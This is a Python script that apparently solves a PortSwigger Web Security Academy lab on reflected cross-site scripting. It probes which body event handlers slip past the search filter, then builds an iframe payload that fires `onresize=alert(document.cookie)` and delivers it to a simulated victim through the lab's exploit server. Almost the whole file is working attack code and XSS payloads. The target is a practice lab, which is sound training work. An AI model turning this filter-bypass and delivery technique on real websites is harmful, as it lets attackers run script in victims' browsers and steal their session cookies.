from bs4 import BeautifulSoup
import requests as s

site = 'acc21fb81eee6f64809a97ca00a10065.web-security-academy.net'

# Use this to search for in the web page
def try_search(search_term):
    search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {search_term} gives code {resp.status_code}')
    else:
        print(f'Error: {search_term} gives response: {resp.text}')

# Previous Levels:
search_term = '''<script>alert(1)</script>'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
if resp.status_code == 200:
    print(f'\nSuccess: {search_url} gives {resp.status_code}')
else:
    print(f'\nError: {search_url} gives {resp.status_code}: {resp.text}')

# Current Level:
odin_id = 'semchuk2'
search_term = f'''<body>{odin_id}</body>'''
search_url = f'https://{site}/?search={search_term}'

# Finding out which attributes are allowed:
attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']
for attribute in attributes:
    try_search(attribute)

# Now to find the exploit site and send the exploit information:
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

search_term = '''<body onresize=alert(document.cookie)></body>'''
exploit_html = f'''<iframe src="https://{site}/?search={search_term}" onload=this.style.width='100px'></iframe>'''
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(exploit_url, data=formData)